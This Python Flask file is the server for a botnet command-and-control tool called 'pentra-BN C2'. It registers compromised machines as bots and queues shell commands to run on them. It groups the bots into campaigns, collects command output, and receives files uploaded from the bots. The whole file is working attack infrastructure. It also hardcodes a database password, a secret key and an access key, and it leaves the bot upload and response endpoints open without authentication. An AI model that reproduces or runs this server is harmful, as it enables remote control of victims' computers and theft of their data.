import os
import json
import time
import ssl
from datetime import datetime
from flask import Flask, render_template, request, jsonify, redirect, url_for, session, flash, send_from_directory
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
from flask_socketio import SocketIO, emit, join_room, leave_room
from OpenSSL import crypto

app = Flask(__name__)
app.config['SECRET_KEY'] = 'pentra-bn-secret-key'

# Database Configuration
DATABASE_URL = "postgresql://postgres:Admin123@localhost:5432/pentrax_db"
app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URL
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# SSL Configuration
SSL_CERT_FILE = 'cert.pem'
SSL_KEY_FILE = 'key.pem'

# Activation Key Configuration
ACTIVATION_KEY = "PENTRA-BN-2024"  # Change this to your desired key

def generate_self_signed_cert():
    """Generate self-signed SSL certificate"""
    if not os.path.exists(SSL_CERT_FILE) or not os.path.exists(SSL_KEY_FILE):
        # Generate key
        key = crypto.PKey()
        key.generate_key(crypto.TYPE_RSA, 2048)
        
        # Generate certificate
        cert = crypto.X509()
        cert.get_subject().C = "US"
        cert.get_subject().ST = "State"
        cert.get_subject().L = "City"
        cert.get_subject().O = "Organization"
        cert.get_subject().OU = "Organizational Unit"
        cert.get_subject().CN = "localhost"
        cert.set_serial_number(1000)
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(365*24*60*60)  # Valid for 1 year
        cert.set_issuer(cert.get_subject())
        cert.set_pubkey(key)
        cert.sign(key, 'sha256')
        
        # Save certificate and key
        with open(SSL_CERT_FILE, "wb") as f:
            f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        with open(SSL_KEY_FILE, "wb") as f:
            f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, key))
        
        print(f"[+] Generated SSL certificate: {SSL_CERT_FILE}, {SSL_KEY_FILE}")

UPLOAD_DIR = os.path.join(os.path.dirname(__file__), 'uploads')
if not os.path.exists(UPLOAD_DIR):
    os.makedirs(UPLOAD_DIR)

db = SQLAlchemy(app)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# --- Database Models ---
class Bot(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    bot_id = db.Column(db.String(64), unique=True, nullable=False)
    ip = db.Column(db.String(64))
    user_agent = db.Column(db.String(256))
    os_info = db.Column(db.String(128))
    status = db.Column(db.String(32), default='online')
    last_seen = db.Column(db.String(64))
    tags = db.Column(db.String(256))
    campaign_id = db.Column(db.Integer, db.ForeignKey('campaign.id'))

class Command(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    command_id = db.Column(db.Integer, unique=True)
    target = db.Column(db.String(64))
    command = db.Column(db.String(256))
    type = db.Column(db.String(64))
    timestamp = db.Column(db.String(64))
    status = db.Column(db.String(32), default='pending')
    result = db.Column(db.Text)
    campaign_id = db.Column(db.Integer, db.ForeignKey('campaign.id'))

class Campaign(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(128), unique=True, nullable=False)
    description = db.Column(db.String(256))
    bots = db.relationship('Bot', backref='campaign', lazy=True)
    commands = db.relationship('Command', backref='campaign', lazy=True)
    created_at = db.Column(db.String(64), default=lambda: datetime.now().isoformat())

# --- Plugin System ---
PLUGIN_DIR = os.path.join(os.path.dirname(__file__), 'plugins')
if not os.path.exists(PLUGIN_DIR):
    os.makedirs(PLUGIN_DIR)

def load_plugins():
    plugins = []
    for fname in os.listdir(PLUGIN_DIR):
        if fname.endswith('.py'):
            try:
                mod_name = fname[:-3]
                mod = __import__(f'plugins.{mod_name}', fromlist=['*'])
                plugins.append({'name': mod_name, 'module': mod})
            except Exception as e:
                print(f"[!] Plugin load error: {fname}: {e}")
    return plugins

# --- Utility Functions ---
def get_stats():
    total_bots = Bot.query.count()
    active_bots = Bot.query.filter_by(status='online').count()
    total_commands = Command.query.count()
    last_activity = Command.query.order_by(Command.timestamp.desc()).first()
    return {
        'total_bots': total_bots,
        'active_bots': active_bots,
        'total_commands': total_commands,
        'last_activity': last_activity.timestamp if last_activity else None
    }

def check_activation_key(key):
    """Check if activation key is valid"""
    return key == ACTIVATION_KEY

# --- Routes ---
@app.route('/')
def dashboard():
    activation_key = request.args.get('key')
    if not activation_key or not check_activation_key(activation_key):
        return render_template('activation.html')
    return render_template('dashboard.html')

@app.route('/activate', methods=['POST'])
def activate():
    key = request.form.get('activation_key')
    if check_activation_key(key):
        return redirect(url_for('dashboard', key=key))
    else:
        flash('Invalid activation key', 'danger')
        return redirect(url_for('dashboard'))

# --- API Endpoints ---
@app.route('/api/bots', methods=['GET', 'POST'])
def api_bots():
    activation_key = request.args.get('key')
    if not activation_key or not check_activation_key(activation_key):
        return jsonify({'error': 'Invalid activation key'}), 401
    
    if request.method == 'GET':
        bots = Bot.query.all()
        return jsonify([{
            'bot_id': b.bot_id,
            'ip': b.ip,
            'user_agent': b.user_agent,
            'os_info': b.os_info,
            'status': b.status,
            'last_seen': b.last_seen,
            'tags': b.tags.split(',') if b.tags else []
        } for b in bots])
    elif request.method == 'POST':
        data = request.get_json()
        bot_id = data.get('bot_id') or f"bot_{int(time.time())}"
        bot = Bot.query.filter_by(bot_id=bot_id).first()
        if not bot:
            bot = Bot(bot_id=bot_id)
        bot.ip = data.get('ip', request.remote_addr)
        bot.user_agent = data.get('user_agent', 'Unknown')
        bot.os_info = data.get('os_info', 'Unknown')
        bot.status = 'online'
        bot.last_seen = datetime.now().isoformat()
        bot.tags = ','.join(data.get('tags', []))
        db.session.add(bot)
        db.session.commit()
        return jsonify({'bot_id': bot_id, 'status': 'registered'})

@app.route('/api/bot/<bot_id>', methods=['GET'])
def api_bot_details(bot_id):
    activation_key = request.args.get('key')
    if not activation_key or not check_activation_key(activation_key):
        return jsonify({'error': 'Invalid activation key'}), 401
    
    bot = Bot.query.filter_by(bot_id=bot_id).first()
    if not bot:
        return jsonify({'error': 'Bot not found'}), 404
    return jsonify({
        'bot_id': bot.bot_id,
        'ip': bot.ip,
        'user_agent': bot.user_agent,
        'os_info': bot.os_info,
        'status': bot.status,
        'last_seen': bot.last_seen,
        'tags': bot.tags.split(',') if bot.tags else []
    })

@app.route('/api/stats')
def api_stats():
    activation_key = request.args.get('key')
    if not activation_key or not check_activation_key(activation_key):
        return jsonify({'error': 'Invalid activation key'}), 401
    
    return jsonify(get_stats())

@app.route('/api/commands', methods=['GET', 'POST'])
def api_commands():
    activation_key = request.args.get('key')
    if not activation_key or not check_activation_key(activation_key):
        return jsonify({'error': 'Invalid activation key'}), 401
    
    if request.method == 'GET':
        commands = Command.query.order_by(Command.timestamp.desc()).all()
        return jsonify([{
            'command_id': c.command_id,
            'target': c.target,
            'command': c.command,
            'type': c.type,
            'timestamp': c.timestamp,
            'status': c.status,
            'result': c.result
        } for c in commands])
    elif request.method == 'POST':
        data = request.get_json()
        command = Command(
            command_id=int(time.time()),
            target=data.get('target', 'all'),
            command=data.get('command', ''),
            type=data.get('type', 'shell'),
            timestamp=datetime.now().isoformat(),
            status='pending'
        )
        db.session.add(command)
        db.session.commit()
        return jsonify({'command_id': command.command_id, 'status': 'sent'})

@app.route('/api/bot/<bot_id>/command', methods=['POST'])
def api_bot_command(bot_id):
    activation_key = request.args.get('key')
    if not activation_key or not check_activation_key(activation_key):
        return jsonify({'error': 'Invalid activation key'}), 401
    
    data = request.get_json()
    command = Command(
        command_id=int(time.time()),
        target=bot_id,
        command=data.get('command', ''),
        type=data.get('type', 'shell'),
        timestamp=datetime.now().isoformat(),
        status='pending'
    )
    db.session.add(command)
    db.session.commit()
    return jsonify({'command_id': command.command_id, 'status': 'sent'})

@app.route('/api/bot/<bot_id>/response', methods=['POST'])
def api_bot_response(bot_id):
    data = request.get_json()
    command = Command.query.filter_by(command_id=data.get('command_id')).first()
    if command:
        command.status = 'completed'
        # Always store result as JSON string
        import json
        result = data.get('result', '')
        try:
            # If already JSON, keep as is
            json.loads(result)
            command.result = result
        except Exception:
            # Otherwise, wrap in JSON
            command.result = json.dumps({'output': result})
        command.completed_at = datetime.utcnow()
        db.session.commit()
    return jsonify({'status': 'received'})

@app.route('/api/campaigns', methods=['GET', 'POST'])
def api_campaigns():
    activation_key = request.args.get('key')
    if not activation_key or not check_activation_key(activation_key):
        return jsonify({'error': 'Invalid activation key'}), 401
    
    if request.method == 'GET':
        campaigns = Campaign.query.all()
        return jsonify([{
            'id': c.id,
            'name': c.name,
            'description': c.description,
            'created_at': c.created_at
        } for c in campaigns])
    elif request.method == 'POST':
        data = request.get_json()
        campaign = Campaign(name=data['name'], description=data.get('description', ''))
        db.session.add(campaign)
        db.session.commit()
        return jsonify({'id': campaign.id, 'status': 'created'})

@app.route('/api/campaign/<int:cid>/assign', methods=['POST'])
def assign_bots_to_campaign(cid):
    activation_key = request.args.get('key')
    if not activation_key or not check_activation_key(activation_key):
        return jsonify({'error': 'Invalid activation key'}), 401
    
    data = request.get_json()
    bot_ids = data.get('bot_ids', [])
    for bot_id in bot_ids:
        bot = Bot.query.filter_by(bot_id=bot_id).first()
        if bot:
            bot.campaign_id = cid
    db.session.commit()
    return jsonify({'status': 'assigned'})

@app.route('/api/plugins', methods=['GET'])
def api_plugins():
    activation_key = request.args.get('key')
    if not activation_key or not check_activation_key(activation_key):
        return jsonify({'error': 'Invalid activation key'}), 401
    
    plugins = load_plugins()
    return jsonify([{'name': p['name']} for p in plugins])

@app.route('/api/upload/<bot_id>', methods=['POST'])
def api_upload(bot_id):
    if 'file' not in request.files:
        return jsonify({'error': 'No file'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No filename'}), 400
    
    filename = f"{bot_id}_{int(time.time())}_{file.filename}"
    filepath = os.path.join(UPLOAD_DIR, filename)
    file.save(filepath)
    
    return jsonify({'filename': filename, 'status': 'uploaded'})

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    return send_from_directory(UPLOAD_DIR, filename)

# --- SocketIO Events ---
@socketio.on('connect')
def ws_connect():
    print(f"Client connected: {request.sid}")

@socketio.on('disconnect')
def ws_disconnect():
    print(f"Client disconnected: {request.sid}")

@socketio.on('join')
def ws_join(data):
    room = data.get('room')
    if room:
        join_room(room)
        print(f"Client joined room: {room}")

@socketio.on('leave')
def ws_leave(data):
    room = data.get('room')
    if room:
        leave_room(room)
        print(f"Client left room: {room}")

@socketio.on('bot_result')
def handle_bot_result(data):
    bot_id = data.get('bot_id')
    command_id = data.get('command_id')
    result = data.get('result')
    
    # Update command status and store result
    command = Command.query.filter_by(command_id=command_id).first()
    if command:
        command.status = 'completed'
        # Always emit result as JSON string
        import json
        try:
            json.loads(result)
            emit_result = result
        except Exception:
            emit_result = json.dumps({'output': result})
        command.result = emit_result
        command.completed_at = datetime.utcnow()
        db.session.commit()
        emit('command_result', {
            'bot_id': bot_id,
            'command_id': command_id,
            'result': emit_result
        }, broadcast=True)

# --- Emit events for new commands/results ---
def notify_new_command(command):
    emit('new_command', {
        'command_id': command.command_id,
        'target': command.target,
        'command': command.command,
        'type': command.type
    }, broadcast=True)

def notify_new_result(result):
    emit('new_result', result, broadcast=True)

# --- Run Server ---
if __name__ == '__main__':
    with app.app_context():
        db.create_all()
        generate_self_signed_cert()
    
    print("[+] Starting pentra-BN C2 server...")
    print(f"[+] Dashboard: http://localhost:5000")
    print(f"[*] Activation Key: {ACTIVATION_KEY}")
    
    # Use threading mode for better command handling
    socketio.run(
        app,
        debug=True,
        host='0.0.0.0',
        port=5000
    ) 